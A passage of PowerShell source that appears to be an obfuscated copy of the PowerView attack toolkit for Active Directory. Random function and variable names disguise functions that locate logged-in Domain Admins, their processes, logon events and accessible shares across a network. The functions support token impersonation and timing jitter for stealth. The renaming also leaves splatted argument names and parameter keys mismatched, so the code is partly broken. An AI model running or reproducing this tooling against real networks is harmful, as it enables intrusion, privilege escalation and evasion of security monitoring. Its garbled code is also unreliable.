                                $nVOVwncr99 = New-Object PSObject
                                $nVOVwncr99 | Add-Member Noteproperty 'UserDomain' $Null
                                $nVOVwncr99 | Add-Member Noteproperty 'UserName' $PYHFAZKa99
                                $nVOVwncr99 | Add-Member Noteproperty 'ComputerName' $ySXJaLJG99
                                $nVOVwncr99 | Add-Member Noteproperty 'SessionFrom' $CName
                                try {
                                    $DKszfpyF99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $nVOVwncr99 | Add-Member NoteProperty 'SessionFromName' $DKszfpyF99
                                }
                                catch {
                                    $nVOVwncr99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }
                                if ($vLJHInkE99) {
                                    $Admin = (tampers -cSHFXHUa99 $CName).IsAdmin
                                    $nVOVwncr99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $nVOVwncr99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $nVOVwncr99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $nVOVwncr99
                            }
                        }
                    }
                    if (-not $etMNQulS99) {
                        $QeiSMboC99 = simplifications -cSHFXHUa99 $ySXJaLJG99
                        ForEach ($User in $QeiSMboC99) {
                            $PYHFAZKa99 = $User.UserName
                            $CQMlcaaA99 = $User.LogonDomain
                            if (($PYHFAZKa99) -and ($PYHFAZKa99.trim() -ne '')) {
                                if ( (-not $fHLMiIko99) -or ($fHLMiIko99 -contains $PYHFAZKa99) -and ($PYHFAZKa99 -notmatch '\$$')) {
                                    $fSaBbaUR99 = @(loneliest -cSHFXHUa99 $ySXJaLJG99)[0].IPAddress
                                    $nVOVwncr99 = New-Object PSObject
                                    $nVOVwncr99 | Add-Member Noteproperty 'UserDomain' $CQMlcaaA99
                                    $nVOVwncr99 | Add-Member Noteproperty 'UserName' $PYHFAZKa99
                                    $nVOVwncr99 | Add-Member Noteproperty 'ComputerName' $ySXJaLJG99
                                    $nVOVwncr99 | Add-Member Noteproperty 'IPAddress' $fSaBbaUR99
                                    $nVOVwncr99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $nVOVwncr99 | Add-Member Noteproperty 'SessionFromName' $Null
                                    if ($vLJHInkE99) {
                                        $Admin = tampers -cSHFXHUa99 $ySXJaLJG99
                                        $nVOVwncr99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $nVOVwncr99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $nVOVwncr99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $nVOVwncr99
                                }
                            }
                        }
                    }
                }
            }
            if ($zkuRoAPL99) {
                podiatrist
            }
        }
        $kYavoJZJ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
            }
            else {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[peons] Total number of hosts: $($DCHakmFd99.count)"
            Write-Verbose "[peons] Delay: $Delay, Jitter: $bdvUWGhd99"
            $lucfSNpw99 = 0
            $AVMuMKMj99 = New-Object System.Random
            ForEach ($ySXJaLJG99 in $DCHakmFd99) {
                $lucfSNpw99 = $lucfSNpw99 + 1
                Start-Sleep -Seconds $AVMuMKMj99.Next((1-$bdvUWGhd99)*$Delay, (1+$bdvUWGhd99)*$Delay)
                Write-Verbose "[peons] Enumerating server $GocAGaEB99 ($lucfSNpw99 of $($DCHakmFd99.Count))"
                Invoke-Command -FtFVcezt99 $moQfbXMC99 -ArgumentList $ySXJaLJG99, $fHLMiIko99, $KSiSznAB99, $etMNQulS99, $kYavoJZJ99
                if ($tYBpqgGN99 -and $PkrqKVpc99) {
                    Write-Verbose "[peons] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[peons] Using threading with threads: $eWhlCNWF99"
            Write-Verbose "[peons] TargetComputers length: $($DCHakmFd99.Length)"
            $KCNYxmCi99 = @{
                'TargetUsers' = $fHLMiIko99
                'CurrentUser' = $KSiSznAB99
                'Stealth' = $etMNQulS99
                'TokenHandle' = $kYavoJZJ99
            }
            director -cSHFXHUa99 $DCHakmFd99 -FtFVcezt99 $moQfbXMC99 -sRRYHnHD99 $KCNYxmCi99 -eWhlCNWF99 $eWhlCNWF99
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function dashed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cSHFXHUa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $nMDVGmar99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ZalVoNke99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qoAZSdEA99,
        [Alias('Unconstrained')]
        [Switch]
        $PjJeGKTQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $MODrPMHQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $oOOUrUST99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $dUbmyVFn99,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $QYevvHzn99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Ymfcwbqe99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CQMlcaaA99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $MVfuQiFt99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $pCHGOVug99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $kKCyknRq99 = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $ljdPYnWY99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $PkrqKVpc99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $bdvUWGhd99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $eWhlCNWF99 = 20
    )
    BEGIN {
        $WEzzUqjJ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $WEzzUqjJ99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['ComputerDomain']) { $WEzzUqjJ99['Domain'] = $nMDVGmar99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $WEzzUqjJ99['LDAPFilter'] = $ZalVoNke99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $WEzzUqjJ99['SearchBase'] = $qoAZSdEA99 }
        if ($PSBoundParameters['Unconstrained']) { $WEzzUqjJ99['Unconstrained'] = $SKpvyXsg99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $WEzzUqjJ99['OperatingSystem'] = $rqmKHnWu99 }
        if ($PSBoundParameters['ComputerServicePack']) { $WEzzUqjJ99['ServicePack'] = $gNnwgaEV99 }
        if ($PSBoundParameters['ComputerSiteName']) { $WEzzUqjJ99['SiteName'] = $iSntscLt99 }
        if ($PSBoundParameters['Server']) { $WEzzUqjJ99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $WEzzUqjJ99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $WEzzUqjJ99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WEzzUqjJ99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $WEzzUqjJ99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $WEzzUqjJ99['Credential'] = $fjBNCklg99 }
        $AvPmHxSP99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $AvPmHxSP99['Identity'] = $Ymfcwbqe99 }
        if ($PSBoundParameters['Domain']) { $AvPmHxSP99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['UserDomain']) { $AvPmHxSP99['Domain'] = $CQMlcaaA99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $AvPmHxSP99['LDAPFilter'] = $MVfuQiFt99 }
        if ($PSBoundParameters['UserSearchBase']) { $AvPmHxSP99['SearchBase'] = $pCHGOVug99 }
        if ($PSBoundParameters['UserAdminCount']) { $AvPmHxSP99['AdminCount'] = $ljdPYnWY99 }
        if ($PSBoundParameters['Server']) { $AvPmHxSP99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $AvPmHxSP99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $AvPmHxSP99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AvPmHxSP99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $AvPmHxSP99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $AvPmHxSP99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['ComputerName']) {
            $DCHakmFd99 = $cSHFXHUa99
        }
        else {
            Write-Verbose '[dashed] Querying computers in the domain'
            $DCHakmFd99 = cowing @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[dashed] TargetComputers length: $($DCHakmFd99.Length)"
        if ($DCHakmFd99.Length -eq 0) {
            throw '[dashed] No hosts found to enumerate'
        }
        if ($PSBoundParameters['ProcessName']) {
            $uPAMrkmO99 = @()
            ForEach ($T in $QYevvHzn99) {
                $uPAMrkmO99 += $T.Split(',')
            }
            if ($uPAMrkmO99 -isnot [System.Array]) {
                $uPAMrkmO99 = [String[]] @($uPAMrkmO99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $fHLMiIko99 = suit @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $okUVKRDf99 = @{
                'Identity' = $kKCyknRq99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $okUVKRDf99['Domain'] = $CQMlcaaA99 }
            if ($PSBoundParameters['UserSearchBase']) { $okUVKRDf99['SearchBase'] = $pCHGOVug99 }
            if ($PSBoundParameters['Server']) { $okUVKRDf99['Server'] = $qgdPgdMB99 }
            if ($PSBoundParameters['SearchScope']) { $okUVKRDf99['SearchScope'] = $TRVzBsDk99 }
            if ($PSBoundParameters['ResultPageSize']) { $okUVKRDf99['ResultPageSize'] = $CgYkCByk99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $okUVKRDf99['ServerTimeLimit'] = $elDiVqTz99 }
            if ($PSBoundParameters['Tombstone']) { $okUVKRDf99['Tombstone'] = $rmzHuzlC99 }
            if ($PSBoundParameters['Credential']) { $okUVKRDf99['Credential'] = $fjBNCklg99 }
            $okUVKRDf99
            $fHLMiIko99 = Mapplethorpe @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        $moQfbXMC99 = {
            Param($cSHFXHUa99, $QYevvHzn99, $fHLMiIko99, $fjBNCklg99)
            ForEach ($ySXJaLJG99 in $cSHFXHUa99) {
                $Up = Test-Connection -Count 1 -Quiet -cSHFXHUa99 $ySXJaLJG99
                if ($Up) {
                    if ($fjBNCklg99) {
                        $CFgOkvwg99 = sapling -fjBNCklg99 $fjBNCklg99 -cSHFXHUa99 $ySXJaLJG99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $CFgOkvwg99 = sapling -cSHFXHUa99 $ySXJaLJG99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($xzZdeUWX99 in $CFgOkvwg99) {
                        if ($QYevvHzn99) {
                            if ($QYevvHzn99 -Contains $xzZdeUWX99.ProcessName) {
                                $xzZdeUWX99
                            }
                        }
                        elseif ($fHLMiIko99 -Contains $xzZdeUWX99.User) {
                            $xzZdeUWX99
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[dashed] Total number of hosts: $($DCHakmFd99.count)"
            Write-Verbose "[dashed] Delay: $Delay, Jitter: $bdvUWGhd99"
            $lucfSNpw99 = 0
            $AVMuMKMj99 = New-Object System.Random
            ForEach ($ySXJaLJG99 in $DCHakmFd99) {
                $lucfSNpw99 = $lucfSNpw99 + 1
                Start-Sleep -Seconds $AVMuMKMj99.Next((1-$bdvUWGhd99)*$Delay, (1+$bdvUWGhd99)*$Delay)
                Write-Verbose "[dashed] Enumerating server $ySXJaLJG99 ($lucfSNpw99 of $($DCHakmFd99.count))"
                $tYBpqgGN99 = Invoke-Command -FtFVcezt99 $moQfbXMC99 -ArgumentList $ySXJaLJG99, $uPAMrkmO99, $fHLMiIko99, $fjBNCklg99
                $tYBpqgGN99
                if ($tYBpqgGN99 -and $PkrqKVpc99) {
                    Write-Verbose "[dashed] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[dashed] Using threading with threads: $eWhlCNWF99"
            $KCNYxmCi99 = @{
                'ProcessName' = $uPAMrkmO99
                'TargetUsers' = $fHLMiIko99
                'Credential' = $fjBNCklg99
            }
            director -cSHFXHUa99 $DCHakmFd99 -FtFVcezt99 $moQfbXMC99 -sRRYHnHD99 $KCNYxmCi99 -eWhlCNWF99 $eWhlCNWF99
        }
    }
}
function voice {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99,
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $pIJjStMG99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $HCZCxfVt99 = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CkBHjpIp99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $QNsvKvrK99 = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Ymfcwbqe99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CQMlcaaA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $MVfuQiFt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $pCHGOVug99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $kKCyknRq99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $ljdPYnWY99,
        [Switch]
        $vLJHInkE99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $PkrqKVpc99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $bdvUWGhd99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $eWhlCNWF99 = 20
    )
    BEGIN {
        $AvPmHxSP99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $AvPmHxSP99['Identity'] = $Ymfcwbqe99 }
        if ($PSBoundParameters['UserDomain']) { $AvPmHxSP99['Domain'] = $CQMlcaaA99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $AvPmHxSP99['LDAPFilter'] = $MVfuQiFt99 }
        if ($PSBoundParameters['UserSearchBase']) { $AvPmHxSP99['SearchBase'] = $pCHGOVug99 }
        if ($PSBoundParameters['UserAdminCount']) { $AvPmHxSP99['AdminCount'] = $ljdPYnWY99 }
        if ($PSBoundParameters['Server']) { $AvPmHxSP99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $AvPmHxSP99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $AvPmHxSP99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AvPmHxSP99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $AvPmHxSP99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $AvPmHxSP99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $fHLMiIko99 = suit @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $okUVKRDf99 = @{
                'Identity' = $kKCyknRq99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $kKCyknRq99"
            if ($PSBoundParameters['UserDomain']) { $okUVKRDf99['Domain'] = $CQMlcaaA99 }
            if ($PSBoundParameters['UserSearchBase']) { $okUVKRDf99['SearchBase'] = $pCHGOVug99 }
            if ($PSBoundParameters['Server']) { $okUVKRDf99['Server'] = $qgdPgdMB99 }
            if ($PSBoundParameters['SearchScope']) { $okUVKRDf99['SearchScope'] = $TRVzBsDk99 }
            if ($PSBoundParameters['ResultPageSize']) { $okUVKRDf99['ResultPageSize'] = $CgYkCByk99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $okUVKRDf99['ServerTimeLimit'] = $elDiVqTz99 }
            if ($PSBoundParameters['Tombstone']) { $okUVKRDf99['Tombstone'] = $rmzHuzlC99 }
            if ($PSBoundParameters['Credential']) { $okUVKRDf99['Credential'] = $fjBNCklg99 }
            $fHLMiIko99 = Mapplethorpe @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters['ComputerName']) {
            $DCHakmFd99 = $cSHFXHUa99
        }
        else {
            $fNBqPzcT99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $fNBqPzcT99['Domain'] = $jnYnRnFJ99 }
            if ($PSBoundParameters['Server']) { $fNBqPzcT99['Server'] = $qgdPgdMB99 }
            if ($PSBoundParameters['Credential']) { $fNBqPzcT99['Credential'] = $fjBNCklg99 }
            Write-Verbose "[voice] Querying for domain controllers in domain: $jnYnRnFJ99"
            $DCHakmFd99 = basso @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($DCHakmFd99 -and ($DCHakmFd99 -isnot [System.Array])) {
            $DCHakmFd99 = @(,$DCHakmFd99)
        }
        Write-Verbose "[voice] TargetComputers length: $($DCHakmFd99.Length)"
        Write-Verbose "[voice] TargetComputers $DCHakmFd99"
        if ($DCHakmFd99.Length -eq 0) {
            throw '[voice] No hosts found to enumerate'
        }
        $moQfbXMC99 = {
            Param($cSHFXHUa99, $HCZCxfVt99, $CkBHjpIp99, $QNsvKvrK99, $fHLMiIko99, $pIJjStMG99, $fjBNCklg99)
            ForEach ($ySXJaLJG99 in $cSHFXHUa99) {
                $Up = Test-Connection -Count 1 -Quiet -cSHFXHUa99 $ySXJaLJG99
                if ($Up) {
                    $mildZVuw99 = @{
                        'ComputerName' = $ySXJaLJG99
                    }
                    if ($HCZCxfVt99) { $mildZVuw99['StartTime'] = $HCZCxfVt99 }
                    if ($CkBHjpIp99) { $mildZVuw99['EndTime'] = $CkBHjpIp99 }
                    if ($QNsvKvrK99) { $mildZVuw99['MaxEvents'] = $QNsvKvrK99 }
                    if ($fjBNCklg99) { $mildZVuw99['Credential'] = $fjBNCklg99 }
                    if ($pIJjStMG99 -or $fHLMiIko99) {
                        if ($fHLMiIko99) {
                            gestates @DomainUserEventArgs | Where-Object {$fHLMiIko99 -contains $_.TargetUserName}
                        }
                        else {
                            $fjGEXlOS99 = 'or'
                            $pIJjStMG99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($pIJjStMG99[$_] -match '&') -or ($pIJjStMG99[$_] -eq 'and')) {
                                        $fjGEXlOS99 = 'and'
                                    }
                                }
                            }
                            $Keys = $pIJjStMG99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            gestates @DomainUserEventArgs | ForEach-Object {
                                if ($fjGEXlOS99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $pIJjStMG99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $pIJjStMG99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        gestates @DomainUserEventArgs
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[voice] Total number of hosts: $($DCHakmFd99.count)"
            Write-Verbose "[voice] Delay: $Delay, Jitter: $bdvUWGhd99"
            $lucfSNpw99 = 0
            $AVMuMKMj99 = New-Object System.Random
            ForEach ($ySXJaLJG99 in $DCHakmFd99) {
                $lucfSNpw99 = $lucfSNpw99 + 1
                Start-Sleep -Seconds $AVMuMKMj99.Next((1-$bdvUWGhd99)*$Delay, (1+$bdvUWGhd99)*$Delay)
                Write-Verbose "[voice] Enumerating server $ySXJaLJG99 ($lucfSNpw99 of $($DCHakmFd99.count))"
                $tYBpqgGN99 = Invoke-Command -FtFVcezt99 $moQfbXMC99 -ArgumentList $ySXJaLJG99, $HCZCxfVt99, $CkBHjpIp99, $QNsvKvrK99, $fHLMiIko99, $pIJjStMG99, $fjBNCklg99
                $tYBpqgGN99
                if ($tYBpqgGN99 -and $PkrqKVpc99) {
                    Write-Verbose "[voice] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[voice] Using threading with threads: $eWhlCNWF99"
            $KCNYxmCi99 = @{
                'StartTime' = $HCZCxfVt99
                'EndTime' = $CkBHjpIp99
                'MaxEvents' = $QNsvKvrK99
                'TargetUsers' = $fHLMiIko99
                'Filter' = $pIJjStMG99
                'Credential' = $fjBNCklg99
            }
            director -cSHFXHUa99 $DCHakmFd99 -FtFVcezt99 $moQfbXMC99 -sRRYHnHD99 $KCNYxmCi99 -eWhlCNWF99 $eWhlCNWF99
        }
    }
}
function excitements {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cSHFXHUa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $nMDVGmar99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ZalVoNke99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qoAZSdEA99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $MODrPMHQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $oOOUrUST99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $dUbmyVFn99,
        [Alias('CheckAccess')]
        [Switch]
        $oqGyIUdf99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $bdvUWGhd99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $eWhlCNWF99 = 20
    )
    BEGIN {
        $WEzzUqjJ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $WEzzUqjJ99['Domain'] = $nMDVGmar99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $WEzzUqjJ99['LDAPFilter'] = $ZalVoNke99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $WEzzUqjJ99['SearchBase'] = $qoAZSdEA99 }
        if ($PSBoundParameters['Unconstrained']) { $WEzzUqjJ99['Unconstrained'] = $SKpvyXsg99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $WEzzUqjJ99['OperatingSystem'] = $rqmKHnWu99 }
        if ($PSBoundParameters['ComputerServicePack']) { $WEzzUqjJ99['ServicePack'] = $gNnwgaEV99 }
        if ($PSBoundParameters['ComputerSiteName']) { $WEzzUqjJ99['SiteName'] = $iSntscLt99 }
        if ($PSBoundParameters['Server']) { $WEzzUqjJ99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $WEzzUqjJ99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $WEzzUqjJ99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WEzzUqjJ99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $WEzzUqjJ99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $WEzzUqjJ99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['ComputerName']) {
            $DCHakmFd99 = $cSHFXHUa99
        }
        else {
            Write-Verbose '[excitements] Querying computers in the domain'
            $DCHakmFd99 = cowing @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[excitements] TargetComputers length: $($DCHakmFd99.Length)"
        if ($DCHakmFd99.Length -eq 0) {
            throw '[excitements] No hosts found to enumerate'
        }
        $moQfbXMC99 = {
            Param($cSHFXHUa99, $oqGyIUdf99, $zkuRoAPL99)
            if ($zkuRoAPL99) {
                $Null = watchman -zkuRoAPL99 $zkuRoAPL99 -Quiet
            }
            ForEach ($ySXJaLJG99 in $cSHFXHUa99) {
                $Up = Test-Connection -Count 1 -Quiet -cSHFXHUa99 $ySXJaLJG99
                if ($Up) {
                    $HRGpPqWs99 = temper -cSHFXHUa99 $ySXJaLJG99
                    ForEach ($Share in $HRGpPqWs99) {
                        $fSwxgNDj99 = $Share.Name
                        $Path = '\\'+$ySXJaLJG99+'\'+$fSwxgNDj99
                        if (($fSwxgNDj99) -and ($fSwxgNDj99.trim() -ne '')) {
                            if ($oqGyIUdf99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }
            if ($zkuRoAPL99) {
                podiatrist
            }
        }
        $kYavoJZJ99 = $Null
        if ($PSBoundParameters['Credential']) {
